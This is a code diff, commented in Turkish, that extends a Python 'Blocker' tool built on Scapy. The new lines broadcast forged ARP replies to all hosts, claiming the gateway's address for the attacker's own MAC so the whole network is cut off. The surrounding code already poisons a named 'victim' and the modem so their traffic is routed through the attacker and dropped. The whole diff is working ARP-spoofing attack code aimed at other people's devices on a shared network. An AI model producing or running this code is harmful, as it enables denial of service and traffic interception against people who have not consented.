@@ -269,12 +269,18 @@ class Blocker:
                     macs_to_poison = list(self.blocked_macs)
                     
                 for mac in macs_to_poison:
+                    # Kurbana (veya modeme) yönelik ARP spoofing
+                    # Hedef MAC modem ise, tüm ağa modemin bizim MAC'imizde olduğunu söyle (Ağı tamamen kesmek için)
                     if mac == self.gateway_mac:
+                        pkt_to_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst="0.0.0.0", hwdst="ff:ff:ff:ff:ff:ff", psrc=self.gateway_ip, hwsrc=my_mac)
+                        sendp(pkt_to_broadcast, iface=self.interface, verbose=False)
                         continue
+                        
                     # Kurbana: Ağ geçidi benim (Trafik bana gelir ve iptables DROP eder)
                     pkt_to_victim = Ether(dst=mac)/ARP(op=2, pdst="0.0.0.0", hwdst=mac, psrc=self.gateway_ip, hwsrc=my_mac)
                     # Modeme: Kurban benim (Yanıtlar bana gelir)
                     if self.gateway_mac:
+                        # Burada kurbanın IP adresini tam bilmiyorsak bile 0.0.0.0 yerine doğrudan kurbanın MAC'ini kendi üstümüze alıyoruz.
                         pkt_to_gateway = Ether(dst=self.gateway_mac)/ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc="0.0.0.0", hwsrc=my_mac)
                         sendp(pkt_to_gateway, iface=self.interface, verbose=False)
                     
